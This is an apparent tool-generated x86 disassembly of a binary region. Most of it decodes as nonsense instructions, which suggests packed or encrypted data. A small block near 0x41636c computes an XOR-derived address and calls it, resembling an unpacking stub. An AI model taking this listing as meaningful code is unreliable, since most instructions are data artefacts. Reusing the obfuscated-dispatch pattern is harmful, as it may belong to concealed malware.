  4160bf:	(bad)  
  4160c0:	xlat   BYTE PTR ds:[ebx]
  4160c1:	test   BYTE PTR ds:[edx],dl
  4160c4:	jne    0x41612d
  4160c6:	inc    esi
  4160c7:	sub    bl,cl
  4160c9:	xchg   BYTE PTR [ecx-0x158d8704],cl
  4160cf:	out    dx,al
  4160d0:	push   ebx
  4160d1:	imul   ebx,ecx,0xb28f2337
  4160d7:	xor    DWORD PTR [ecx+0x4d],0xec5dd698
  4160de:	sti    
  4160df:	dec    ebp
  4160e0:	dec    ebp
  4160e1:	xor    DWORD PTR [eax+ebx*2-0x53f78855],esi
  4160e8:	xchg   ebp,eax
  4160e9:	xor    eax,0x91fad650
  4160ee:	dec    ebx
  4160ef:	lea    edi,[ebx-0x29]
  4160f2:	xchg   edi,eax
  4160f3:	js     0x4160e9
  4160f5:	int3   
  4160f6:	xchg   ebp,eax
  4160f7:	ins    DWORD PTR es:[edi],dx
  4160f8:	inc    ebx
  4160f9:	jne    0x4160a6
  4160fb:	mov    edi,0x5ff86522
  416100:	push   ebx
  416101:	jns    0x4160c6
  416103:	not    dh
  416105:	dec    esi
  416106:	jno    0x4160d9
  416108:	sub    al,0x55
  41610a:	test   al,0xc
  41610c:	push   edx
  41610d:	xchg   ebx,eax
  41610e:	mov    esp,0xc70914a3
  416113:	icebp  
  416114:	clc    
  416115:	adc    bh,BYTE PTR [edx]
  416117:	loopne 0x4160cd
  416119:	cmp    al,0xc0
  41611b:	xchg   ebx,eax
  41611c:	push   ebp
  41611d:	inc    si
  41611f:	or     esi,DWORD PTR [esi-0x563451d1]
  416125:	out    dx,eax
  416126:	in     eax,0xee
  416128:	and    eax,0x112a7df9
  41612d:	fcom   DWORD PTR [ebx+0x73]
  416130:	test   BYTE PTR [eax-0x26],ah
  416133:	mov    eax,ds:0x6909e2d0
  416138:	retf   0xc26
  41613b:	fsub   QWORD PTR [eax-0x71897b88]
  416141:	mov    dl,BYTE PTR [ebx]
  416143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416144:	ins    BYTE PTR es:[edi],dx
  416145:	mov    al,0xdf
  416147:	xchg   BYTE PTR [edi-0xc],bl
  41614a:	(bad)  
  41614c:	aaa    
  41614d:	popa   
  41614e:	in     al,dx
  41614f:	retf   0xde7c
  416152:	imul   esp,ebp,0x29b52e7
  416158:	dec    ecx
  416159:	xor    ch,ch
  41615b:	and    BYTE PTR [ecx],ah
  41615d:	iret   
  41615e:	sub    DWORD PTR [edx+ebx*2+0x59e19f8e],ebx
  416165:	(bad)  
  416167:	hlt    
  416168:	sub    al,0xd0
  41616a:	sub    esi,DWORD PTR [ebp+0x3c]
  41616d:	add    eax,eax
  41616f:	jo     0x416102
  416171:	out    dx,eax
  416172:	fidiv  WORD PTR [edi]
  416174:	daa    
  416175:	push   ds
  416176:	jmp    0x6138:0xb3399592
  41617d:	out    dx,al
  41617e:	mov    ebx,DWORD PTR [eax+0x61f3866e]
  416184:	push   ds
  416185:	xor    DWORD PTR [eax-0x5d4a6109],edx
  41618b:	xor    BYTE PTR [ecx+eax*1-0x7d17fe02],ah
  416192:	mov    dh,0xc0
  416194:	scas   eax,DWORD PTR es:[edi]
  416195:	mov    ds:0x34cf5503,al
  41619a:	add    DWORD PTR [edx+0x1bb04106],edx
  4161a0:	mov    ebx,0x18b9c032
  4161a5:	push   esi
  4161a6:	ja     0x416189
  4161a8:	cmp    eax,0x4b52af72
  4161ad:	or     al,0x6
  4161af:	cli    
  4161b0:	out    dx,eax
  4161b1:	call   FWORD PTR [esp+ebp*2]
  4161b4:	xchg   ebx,eax
  4161b5:	fs xor ah,0x91
  4161b9:	imul   ebx,DWORD PTR [ebp+eiz*8-0x16],0xb075115a
  4161c1:	dec    ecx
  4161c2:	mov    ah,0x2e
  4161c4:	mov    eax,edx
  4161c6:	into   
  4161c7:	push   ds
  4161c8:	popf   
  4161c9:	scas   eax,DWORD PTR es:[edi]
  4161ca:	(bad)
  4161cd:	sub    DWORD PTR [esi+0x3],ecx
  4161d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161d1:	inc    ebx
  4161d2:	xchg   esi,eax
  4161d3:	sahf   
  4161d4:	pop    edi
  4161d5:	cmp    eax,0xfb9d85d4
  4161da:	fwait
  4161db:	xchg   ebx,eax
  4161dc:	pop    ebx
  4161dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161de:	setl   BYTE PTR ss:[eax]
  4161e2:	add    DWORD PTR [eax+0x4bfc9c87],eax
  4161e8:	lea    ecx,[eax]
  4161ea:	lock add eax,esi
  4161ed:	dec    edx
  4161ee:	xchg   DWORD PTR [edi-0x13d479f5],ebx
  4161f4:	cs iret 
  4161f6:	cmp    eax,0x1069e776
  4161fb:	jge    0x416279
  4161fd:	sti    
  4161fe:	xchg   esi,eax
  4161ff:	sub    al,0x53
  416201:	adc    eax,0x1bc9dfe5
  416206:	loope  0x4161eb
  416208:	sbb    al,0x4c
  41620a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41620b:	out    0xf3,eax
  41620d:	cmp    BYTE PTR [esi],bl
  41620f:	xchg   ebp,eax
  416210:	sub    eax,DWORD PTR [ecx-0x3945c2bd]
  416216:	sbb    esp,DWORD PTR [edi+0x59]
  416219:	repz xor ecx,DWORD PTR [ecx+0x2c]
  41621d:	js     0x4161f4
  41621f:	or     edx,ebx
  416221:	bound  esi,QWORD PTR [ecx-0xf]
  416224:	or     BYTE PTR [esp+ebp*2-0x10b6eba3],bh
  41622b:	sahf   
  41622c:	dec    ecx
  41622d:	or     eax,0xf2be29d4
  416232:	(bad)  
  416233:	sub    al,0x14
  416235:	sti    
  416236:	pushf  
  416237:	pop    ss
  416238:	mov    al,ds:0x8ae90e4c
  41623d:	xor    eax,0xeb7948e4
  416242:	cs mov edx,0x26fd27e8
  416248:	fisttp DWORD PTR ds:0x107569a5
  41624e:	jae    0x4161d3
  416250:	leave  
  416251:	adc    DWORD PTR [ebx-0x72],ecx
  416254:	aaa    
  416255:	inc    edx
  416256:	addr16 or eax,0xc110f1d0
  41625c:	jmp    0xcdf4:0xc319bdbb
  416263:	pop    ebp
  416264:	mov    ebx,cs
  416266:	data16 sub bh,ah
  416269:	inc    eax
  41626a:	retf   
  41626b:	out    dx,eax
  41626c:	inc    ecx
  41626d:	dec    edx
  41626e:	xchg   ebp,eax
  41626f:	test   al,0xb
  416271:	lods   al,BYTE PTR ds:[esi]
  416272:	and    eax,0x8fdaaf9f
  416277:	cmc    
  416278:	xchg   ebx,eax
  416279:	push   esp
  41627a:	and    ebx,0xcf63a2aa
  416280:	pop    ds
  416281:	(bad)  
  416282:	bnd jbe 0x4162a2
  416285:	fsub   DWORD PTR [ebx+eax*1-0x2c]
  416289:	fisubr WORD PTR [ecx-0x77]
  41628c:	sub    bl,BYTE PTR [ecx-0x36c967ab]
  416292:	sar    BYTE PTR [edi+0x7908e9cc],1
  416298:	cwde   
  416299:	pop    es
  41629a:	xor    BYTE PTR [eax-0x19],0xd2
  41629e:	daa    
  41629f:	mov    al,ds:0x49e83f49
  4162a4:	add    al,0xae
  4162a6:	call   0x3b92af51
  4162ab:	scas   al,BYTE PTR es:[edi]
  4162ac:	shr    DWORD PTR [esi-0x38],0xcf
  4162b0:	sub    ah,BYTE PTR [edx+0x32]
  4162b3:	mov    ss,esp
  4162b5:	cmp    eax,0xecb8a517
  4162ba:	sub    eax,0xdf3b75cd
  4162bf:	push   edi
  4162c0:	fwait
  4162c1:	add    dh,BYTE PTR [eax+0x67c8a06f]
  4162c7:	add    eax,0x5fafd2b2
  4162cc:	ss popa 
  4162ce:	sub    BYTE PTR [ebx+0x674a893a],bh
  4162d4:	mov    ebp,0xac2020bf
  4162d9:	or     eax,0x761429a0
  4162de:	xor    DWORD PTR [ecx+0x2304de96],0x5c
  4162e5:	shl    DWORD PTR [ebx+0x56fe4b24],cl
  4162eb:	pop    ss
  4162ec:	mov    eax,ds:0xa222a590
  4162f1:	xchg   DWORD PTR [eax+ebx*4-0x111112d0],ebp
  4162f8:	adc    DWORD PTR [ecx+0x7999e7b6],esi
  4162fe:	pop    ds
  4162ff:	(bad)  
  416300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416301:	add    eax,0x208e1f81
  416306:	loopne 0x416315
  416308:	mov    es,WORD PTR ds:0x3568567a
  41630e:	or     dh,BYTE PTR [edx-0x36]
  416311:	call   0x3b092f5f
  416316:	jle    0x41634c
  416318:	jae    0x416332
  41631a:	ret    0x882a
  41631d:	mov    dh,0x3c
  41631f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416320:	xrelease mov BYTE PTR cs:[eax+0x37],ch
  416325:	mov    ch,0x8d
  416327:	lods   al,BYTE PTR ds:[esi]
  416328:	rcl    DWORD PTR [ecx+esi*4-0x3b],0x6b
  41632d:	dec    edi
  41632e:	adc    eax,0x64889013
  416333:	mov    ecx,cs
  416335:	push   cs
  416336:	mov    ebp,0x1db992ec
  41633b:	push   ebx
  41633c:	lock (bad) 
  41633e:	push   esi
  41633f:	pop    esp
  416340:	or     eax,0xacc4f563
  416345:	xor    al,0xce
  416347:	mov    edi,0x432ce607
  41634c:	mov    ecx,0x86403474
  416351:	inc    edi
  416352:	sbb    BYTE PTR [ecx+0x5092c8c3],0x5b
  416359:	sub    ecx,0x2f
  41635c:	mov    ds:0x89dac77f,eax
  416361:	outs   dx,DWORD PTR ds:[esi]
  416362:	or     DWORD PTR [edi-0x714d7f],0x77d66759
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x1ae6c841
  4163bf:	fnstcw WORD PTR [edx+0x707f1413]
  4163c5:	mov    ecx,0xa670707e
  4163ca:	jl     0x41642b
  4163cc:	std    
  4163cd:	ins    DWORD PTR es:[edi],dx
  4163ce:	mov    bh,0x4
  4163d0:	(bad)  
  4163d2:	stos   DWORD PTR es:[edi],eax
  4163d3:	xchg   ebp,eax
  4163d4:	xchg   esi,eax
  4163d5:	mov    ch,0xcf
  4163d7:	sub    BYTE PTR [edx],0xc8
  4163da:	xor    al,BYTE PTR [ebx]
  4163dc:	add    BYTE PTR [edi+0x33],al
  4163df:	fnstsw WORD PTR [edx-0x28524a28]
  4163e5:	aaa    
  4163e6:	sub    BYTE PTR [ebx+0x46],ah
  4163e9:	sbb    eax,DWORD PTR [eax]
  4163eb:	pop    edx
  4163ec:	and    BYTE PTR [esi],al
  4163ee:	and    edi,ecx
  4163f0:	ds pop ebp
  4163f2:	push   eax
  4163f3:	mov    al,ds:0xeb8a2a1
  4163f8:	cdq    
  4163f9:	inc    ebp
  4163fa:	or     eax,0x6b0679da
  4163ff:	xor    DWORD PTR [eax+0x65],edx
  416402:	or     eax,0x997c726
  416407:	pop    ebp
  416408:	pop    esp
  416409:	aaa    
  41640a:	push   esi
  41640b:	jge    0x41638d
  41640d:	xor    ah,BYTE PTR [ebp-0x75]
  416410:	add    eax,0xf8ec637e
  416415:	pop    ecx
  416416:	(bad)
  416419:	scas   al,BYTE PTR es:[edi]
  41641a:	fdivr  st,st(6)
  41641c:	mov    esp,0x7ae1c86b
  416421:	arpl   WORD PTR [ecx+0x72],di
  416424:	mov    ebp,0x8cbf3fb6
  416429:	push   edi
  41642a:	sub    al,cl
  41642c:	mov    ds:0x5b9ec553,eax
  416431:	adc    edx,DWORD PTR [esi+esi*8+0x726b95cd]
  416438:	lods   al,BYTE PTR ds:[esi]
  416439:	fnstcw WORD PTR ds:0xf6a8dc0e
  41643f:	inc    edx
  416440:	imul   ebx,DWORD PTR [ecx+0x49077192],0xd6fbddb7
  41644a:	jp     0x416454
  41644c:	jg     0x4163ee
  41644e:	aaa    
  41644f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416450:	fdivr  QWORD PTR [edx-0x2d]
  416453:	xchg   ecx,eax
  416454:	xor    al,0xd8
  416456:	mov    BYTE PTR [esi-0x7e5c128f],0x97
  41645d:	int    0x75
  41645f:	pop    edi
  416460:	in     al,dx
  416461:	mov    WORD PTR [ebx],?
  416463:	xlat   BYTE PTR ds:[ebx]
  416464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416465:	dec    ebp
  416466:	add    BYTE PTR [eax-0x5d],al
  416469:	cs pop ebx
  41646b:	add    ah,dh
  41646d:	retf   
  41646e:	cmp    DWORD PTR [ebx],0x7e61164d
  416474:	scas   eax,DWORD PTR es:[edi]
  416475:	(bad)  
  416478:	repnz dec esp
  41647a:	in     eax,0x6f
  41647c:	fld    st(0)
  41647e:	push   es
  41647f:	popa   
  416480:	loope  0x4164d6
  416482:	in     eax,0x42
  416484:	mov    dl,0xf7
  416486:	fld    QWORD PTR [ecx]
  416488:	fld    QWORD PTR [edx+0x10]
  41648b:	push   esi
  41648c:	mov    ebx,0xddeb741d
  416491:	cld    
  416492:	sub    cl,BYTE PTR [esi]
  416494:	dec    esi
  416495:	lods   al,BYTE PTR ds:[esi]
  416496:	ins    BYTE PTR es:[edi],dx
  416497:	(bad)
  41649a:	ds pop esp
  41649c:	pop    eax
  41649d:	aam    0xdb
  41649f:	push   es
  4164a0:	sbb    eax,0x2ea51819
  4164a5:	in     al,0x92
  4164a7:	lea    ebx,[edi]
  4164a9:	ror    esp,1
  4164ab:	or     ch,BYTE PTR [esi]
  4164ad:	dec    ebx
  4164ae:	and    ebx,DWORD PTR [ecx]
  4164b0:	push   cs
  4164b1:	or     eax,DWORD PTR [esi+eax*2+0x3b614d67]
  4164b8:	daa    
  4164b9:	inc    esi
  4164ba:	jmp    0x416470
  4164bc:	xchg   BYTE PTR [esi+ebp*4-0x2bb7aa7c],dh
  4164c3:	sub    ebp,DWORD PTR [esi+0x60]
  4164c6:	cld    
  4164c7:	test   eax,0x1e5be0bd
  4164cc:	jmp    0x7e497161
  4164d1:	and    eax,0x91b320b1
  4164d6:	mov    cs,WORD PTR [esi-0x62]
  4164d9:	cmp    esi,ebx
  4164db:	push   ebp
  4164dc:	in     eax,0x91
  4164de:	add    eax,0xdd4de103
  4164e3:	xchg   esp,eax
  4164e4:	aaa    
  4164e5:	adc    ah,dl
  4164e7:	push   es
  4164e8:	inc    esp
  4164e9:	sub    al,0xd8
  4164eb:	inc    ecx
  4164ec:	jne    0x41648a
  4164ee:	inc    edi
  4164ef:	add    BYTE PTR [esi-0x62],ch
  4164f2:	lahf   
  4164f3:	or     BYTE PTR [esi],0x48
  4164f6:	(bad)  
  4164f7:	cmp    edi,ebp
  4164f9:	fild   WORD PTR [eax+0x4b]
  4164fc:	cwde   
  4164fd:	xor    edi,DWORD PTR [edi]
  4164ff:	shl    BYTE PTR [edx-0x5699246e],1
  416505:	pop    ebx
  416506:	fcmovb st,st(0)
  416508:	in     al,0x52
  41650a:	push   cs
  41650b:	cdq    
  41650c:	rcr    DWORD PTR [edx],cl
  41650e:	out    dx,eax
  41650f:	stc    
  416510:	mov    ebp,0x42aa743b
  416515:	popa   
  416516:	(bad)  
  416517:	stos   BYTE PTR es:[edi],al
  416518:	mov    ecx,0x588ce152
  41651d:	bound  esi,QWORD PTR [esi]
  41651f:	push   edi
  416520:	rcr    DWORD PTR [ebp+0x63],1
  416523:	shl    dh,1
  416525:	mov    ds:0x39d73adc,eax
  41652a:	mov    esi,0xbf80a2d2
  41652f:	sbb    ebx,DWORD PTR [ecx-0x1f76fa24]
  416535:	idiv   BYTE PTR [ebp+ecx*8-0x6a0ccc13]
  41653c:	mov    ds:0x84be69c3,eax
  416541:	leave  
  416542:	outs   dx,BYTE PTR ds:[esi]
  416543:	loop   0x4164e2
  416545:	push   esi
  416546:	mov    BYTE PTR [esi],al
  416548:	(bad)  
  416549:	inc    edi
  41654a:	and    BYTE PTR [edx+ebp*2-0x63],dl
  41654e:	out    0xa9,eax
  416550:	add    al,0xac
  416552:	adc    ebp,DWORD PTR [ecx+eax*1+0x5111716f]
  416559:	sbb    eax,DWORD PTR [edi]
  41655b:	clc    
  41655c:	in     eax,dx
  41655d:	and    dl,cl
  41655f:	dec    ebp
  416560:	lea    eax,[edx-0x37de4e30]
  416566:	xchg   BYTE PTR [ecx+0x0],ah
  416569:	lahf   
  41656a:	mov    ah,0xdf
  41656c:	adc    eax,0x49f3f2d1
  416571:	xlat   BYTE PTR ds:[ebx]
  416572:	loop   0x4165cf
  416574:	xchg   esi,eax
  416575:	cmp    dh,al
  416577:	std    
  416578:	popf   
  416579:	pushf  
  41657a:	mov    ebp,ebp
  41657c:	stos   BYTE PTR es:[edi],al
  41657d:	ret    0x4f2f
  416580:	fist   WORD PTR [eax-0x4]
  416583:	mov    ecx,0x7f4bd292
  416588:	int3   
  416589:	outs   dx,BYTE PTR ds:[esi]
  41658a:	imul   eax,DWORD PTR [eax-0x6de2e71c],0x747e2a97
  416594:	dec    ebx
  416595:	in     eax,dx
  416596:	and    BYTE PTR [edi],0xb2
  416599:	ss out 0x6d,al
  41659c:	popa   
  41659d:	push   ss
  41659e:	lea    edx,[ecx+0x4]
  4165a1:	std    
  4165a2:	mov    ah,0x6c
  4165a4:	mov    dl,BYTE PTR [edi+0x7d635445]
  4165aa:	xor    ebp,ecx
  4165ac:	outs   dx,DWORD PTR ds:[esi]
  4165ad:	xchg   esi,ebx
  4165af:	adc    ebp,DWORD PTR [ebx-0x3b982b1e]
  4165b5:	pop    edx
  4165b6:	push   cs
  4165b7:	sub    eax,0xae090c1d
  4165bc:	jge    0x416609
  4165be:	or     eax,0x7d4a74a0
  4165c3:	ins    DWORD PTR es:[edi],dx
  4165c4:	(bad)  
  4165c5:	sbb    ebx,DWORD PTR [edx+0x5f]
  4165c8:	js     0x41659a
  4165ca:	xchg   DWORD PTR [edi],esi
  4165cc:	xchg   ebx,eax
  4165cd:	(bad)  
  4165ce:	or     ebp,DWORD PTR [ebp+0x7341c7a]
  4165d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165d5:	xor    eax,0xc05c5bca
  4165da:	mov    esi,0x2c344efc
  4165df:	inc    eax
  4165e0:	retf   0x438f
  4165e3:	in     al,dx
  4165e4:	into   
  4165e5:	sahf   
  4165e6:	sub    eax,0x466d5938
  4165eb:	inc    ebp
  4165ec:	inc    ebx
  4165ed:	sub    eax,DWORD PTR [esi+0x8483828]
  4165f3:	iret   
  4165f4:	aam    0x1
  4165f6:	gs addr16 jp 0x416642
  4165fa:	outs   dx,DWORD PTR ds:[esi]
  4165fb:	lods   eax,DWORD PTR ds:[esi]
  4165fc:	arpl   WORD PTR [ebx],sp
  4165fe:	pop    eax
  4165ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416600:	inc    esi
  416601:	hlt    
  416602:	leave  
  416603:	(bad)  
  416604:	inc    edx
  416605:	jmp    0xaac3:0x763d572d
  41660c:	xchg   BYTE PTR [esi-0x5da804a9],cl
  416612:	fild   DWORD PTR [ecx+0x1d7be015]
  416618:	xlat   BYTE PTR ds:[ebx]
  416619:	loop   0x4165a2
  41661b:	arpl   WORD PTR [ebp+0x2a],dx
  41661e:	and    BYTE PTR [ebx+ebx*1-0x7e],0xd
  416623:	popa   
  416624:	loope  0x416616
  416626:	cld    
  416627:	std    
  416628:	cmp    eax,0xca3c0a78
  41662d:	inc    edi
  41662e:	dec    edx
  41662f:	sub    esp,DWORD PTR [ecx+edx*8]
  416632:	dec    ecx
  416633:	pop    ss
  416634:	bound  ebp,QWORD PTR [ebp+edi*4-0x57f12146]
  41663b:	sbb    al,0xc8
  41663d:	xchg   ebp,eax
  41663e:	out    0x97,eax
  416640:	jnp    0x41664b
  416642:	mov    ah,0x7b
  416644:	aaa    
  416645:	loope  0x416672
  416647:	dec    esp
  416648:	pop    edx
  416649:	sti    
  41664a:	push   esp
  41664b:	push   esp
  41664c:	mov    dh,0xe7
  41664e:	outs   dx,DWORD PTR ds:[esi]
  41664f:	pop    ebx
  416650:	jecxz  0x4166c6
  416652:	xchg   ebx,eax
  416653:	xchg   ebp,eax
  416654:	pushfw 
  416656:	fwait
  416657:	je     0x4166ca
  416659:	fidivr DWORD PTR [eax+0x2a]
  41665c:	xchg   BYTE PTR [esi],cl
  41665e:	es hlt 
  416660:	cmp    ah,BYTE PTR [edi+ecx*8-0x49b1156d]
  416667:	rcr    DWORD PTR [eax+ecx*1],1
  41666a:	clc    
  41666b:	xor    eax,DWORD PTR [ebx+ecx*8+0x7f]
  41666f:	mov    dh,0x9a
  416671:	cld    
  416672:	rcr    DWORD PTR [edi],1
  416674:	adc    al,0x26
  416676:	ja     0x4166ea
  416678:	pusha  
  416679:	inc    ecx
  41667a:	mov    esp,0xae775f57
  41667f:	xor    dh,bl
  416681:	enter  0xcc4,0xe0
  416685:	push   edx
  416686:	pop    ebx
  416687:	mov    ebp,0x9b061377
  41668c:	das    
  41668d:	xchg   DWORD PTR [edx+eiz*2-0x6e],ebp
  416691:	push   0xa
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x416634
  4166ae:	in     al,dx
  4166af:	jmp    0x416669
  4166b1:	pop    esp
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0xf270707e
  4166ba:	int    0x74
  4166bc:	inc    ebx
  4166bd:	jbe    0x41666e
  4166bf:	inc    edi
  4166c0:	pusha  
  4166c1:	sbb    ch,0x48
  4166c4:	(bad)  
  4166c5:	jmp    0x672bade2
  4166ca:	lock jg 0x416699
  4166cd:	inc    ecx
  4166ce:	cmc    
  4166cf:	lods   eax,DWORD PTR ds:[esi]
  4166d0:	dec    edi
  4166d1:	inc    eax
  4166d2:	inc    ebx
  4166d3:	push   ecx
  4166d4:	push   esp
  4166d5:	push   0xec9d673a
  4166da:	daa    
  4166db:	and    BYTE PTR [edi+0x33],ch
  4166de:	jl     0x416674
  4166e0:	out    0x79,al
  4166e2:	mov    bl,0xd3
  4166e4:	push   edx
  4166e5:	test   eax,0x1fc04ee0
  4166ea:	jl     0x416707
  4166ec:	aaa    
  4166ed:	xchg   esp,eax
  4166ee:	dec    ebp
  4166ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166f0:	pusha  
  4166f1:	push   edi
  4166f2:	mov    edi,ebx
  4166f4:	mov    ebp,esp
  4166f6:	iret   
  4166f7:	ret    
  4166f8:	and    al,0xc0
  4166fa:	and    DWORD PTR [esi+0xb507bcf],0x9c52bc71
  416704:	mov    dh,0xd6
  416706:	out    0xd1,eax
  416708:	ret    0x874b
  41670b:	jno    0x41672f
  41670d:	sbb    eax,0x1bf5a7d2
  416712:	cmp    al,0xb2
  416714:	jmp    0x1e52:0xf886fd12
  41671b:	xor    dh,BYTE PTR [edi+0x9]
  41671e:	or     al,0xc9
  416720:	mov    ecx,0x35f94588
  416725:	idiv   esp
  416727:	lods   eax,DWORD PTR ds:[esi]
  416728:	cmp    BYTE PTR ds:0x57063a90,dl
  41672e:	push   esp
  41672f:	adc    al,0x88
  416731:	loopne 0x416710
  416733:	sbb    DWORD PTR [edx],ebx
  416735:	loop   0x416790
  416737:	in     al,0x4d
  416739:	daa    
  41673a:	add    dh,dl
  41673c:	pusha  
  41673d:	jl     0x416728
  41673f:	sub    DWORD PTR [ebx+0x3e],0xfffffff8
  416743:	mov    ss,WORD PTR [eax+0x68b04f56]
  416749:	fdivr  DWORD PTR [edx-0x15]
  41674c:	scas   al,BYTE PTR es:[edi]
  41674d:	jmp    0x9a0d:0x98e00ac3
  416754:	stc    
  416755:	sub    DWORD PTR [ecx-0x5e],0x3aee3880
  41675c:	leave  
  41675d:	push   es
  41675e:	leave  
  41675f:	or     dl,BYTE PTR [esi+ebx*2]
  416762:	push   0x14d11e78
  416767:	leave  
  416768:	(bad)  
  416769:	sbb    dl,al
  41676b:	(bad)  
  41676c:	sar    esi,cl
  41676e:	xchg   esp,eax
  41676f:	mov    ds,WORD PTR [edx]
  416771:	js     0x41671c
  416773:	popf   
  416774:	xor    cl,BYTE PTR [ecx]
  416776:	jge    0x416755
  416778:	arpl   WORD PTR [edi],di
  41677a:	lds    eax,FWORD PTR [eax]
  41677c:	pop    ebx
  41677d:	rol    BYTE PTR [edi-0x289e91a8],cl
  416783:	jge    0x416802
  416785:	hlt    
  416786:	out    0x4,eax
  416788:	xchg   edi,eax
  416789:	iret   
  41678a:	scas   eax,DWORD PTR es:[edi]
  41678b:	js     0x416789
  41678d:	(bad)  
  41678f:	and    bl,0x94
  416792:	ja     0x4167dc
  416794:	add    cl,BYTE PTR [ecx+0x78]
  416797:	std    
  416798:	mov    esp,0xc4805215
  41679d:	lds    ecx,FWORD PTR [ebx+0x48]
  4167a0:	aaa    
  4167a1:	test   eax,0x24af1acb
  4167a6:	and    bl,al
  4167a8:	test   DWORD PTR [ecx-0x46f6d60b],eax
  4167ae:	lods   al,BYTE PTR ds:[esi]
  4167af:	je     0x416740
  4167b1:	je     0x4167b5
  4167b3:	mov    edi,0x231abf20
  4167b8:	pop    ecx
  4167b9:	out    dx,al
  4167ba:	mov    ah,0x54
  4167bc:	push   0x22
  4167be:	jne    0x4167a4
  4167c0:	call   0x71e6:0xaaa3ea80
  4167c7:	sub    al,0x0
  4167c9:	ficomp WORD PTR [ecx]
  4167cb:	push   esi
  4167cc:	sub    eax,0x6dfc398a
  4167d1:	fwait
  4167d2:	dec    esp
  4167d3:	idiv   DWORD PTR ds:0xc3fb37ab
  4167d9:	push   eax
  4167da:	inc    esp
  4167db:	inc    esp
  4167dc:	xor    dh,ch
  4167de:	fnstenv [esi-0x5a06a492]
  4167e4:	sub    eax,0xea74ce68
  4167e9:	int    0x36
  4167eb:	adc    eax,edx
  4167ed:	dec    ecx
  4167ee:	fsub   DWORD PTR [ecx+eiz*1-0x6b]
  4167f2:	mov    eax,ds:0x6a1e0fc7
  4167f7:	adc    edx,DWORD PTR [edx-0x32]
  4167fa:	bound  esp,QWORD PTR [edx+0x7e]
  4167fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167fe:	leave  
  4167ff:	stos   DWORD PTR es:[edi],eax
  416800:	jg     0x416847
  416802:	dec    esp
  416803:	mov    edi,0xd7bc22ce
  416808:	push   ebx
  416809:	sub    bl,bh
  41680b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41680c:	inc    sp
  41680e:	cmc    
  41680f:	rcl    DWORD PTR [edx-0x77cd7366],0xda
  416816:	jns    0x41686c
  416818:	mov    eax,0xebc14ebc
  41681d:	adc    DWORD PTR [esi+ebx*2+0x48af38bd],esi
  416824:	mov    BYTE PTR [esi+0x7ae15440],ah
  41682a:	pop    ebx
  41682b:	fbstp  TBYTE PTR [esi-0x15]
  41682e:	xchg   edi,eax
  41682f:	push   edi
  416830:	push   ecx
  416831:	mov    eax,0xe33bccf0
  416836:	xchg   ecx,eax
  416837:	sbb    DWORD PTR [ebx],0xffffffd8
  41683a:	xchg   ebp,eax
  41683b:	mov    bh,BYTE PTR ds:0x9d7be871
  416841:	pop    ebp
  416842:	int    0xa8
  416844:	inc    eax
  416845:	not    bl
  416847:	imul   edx,edi,0xffffffbd
  41684a:	sub    al,0x51
  41684c:	add    DWORD PTR [edi],0x5e
  41684f:	sti    
  416850:	xor    DWORD PTR [ecx+edx*2-0x2e2d5863],eax
  416857:	xchg   ebx,eax
  416858:	test   DWORD PTR [ebx+0x7a33d075],edx
  41685e:	mov    eax,0x664ee96f
  416863:	mov    al,0x4e
  416865:	bnd ret 
  416867:	or     bh,cl
  416869:	push   ss
  41686a:	pushf  
  41686b:	xchg   ebp,eax
  41686c:	inc    ecx
  41686d:	inc    ecx
  41686e:	out    dx,al
  41686f:	jbe    0x416810
  416871:	jae    0x41683d
  416873:	mov    cl,0xa8
  416875:	cmp    ecx,DWORD PTR [edx]
  416877:	dec    ebp
  416878:	cmp    eax,0xdbe82312
  41687d:	pushf  
  41687e:	add    BYTE PTR [ecx+0x6e],cl
  416881:	div    BYTE PTR [edx+edi*4-0x6a]
  416885:	call   0x6314:0xae8353ba
  41688c:	pop    esp
  41688d:	call   0x57fb:0x29928756
  416894:	enter  0x2111,0xbc
  416898:	dec    edx
  416899:	lods   eax,DWORD PTR cs:[esi]
  41689b:	sahf   
  41689c:	dec    ebp
  41689d:	xor    cl,BYTE PTR [eax]
  41689f:	pop    eax
  4168a0:	es push eax
  4168a2:	popa   
  4168a3:	in     al,dx
  4168a4:	jo     0x416892
  4168a6:	int3   
  4168a7:	jl     0x41684d
  4168a9:	inc    ebp
  4168aa:	sub    BYTE PTR [eax+edx*2-0x75],ch
  4168ae:	fdivr  DWORD PTR [esi]
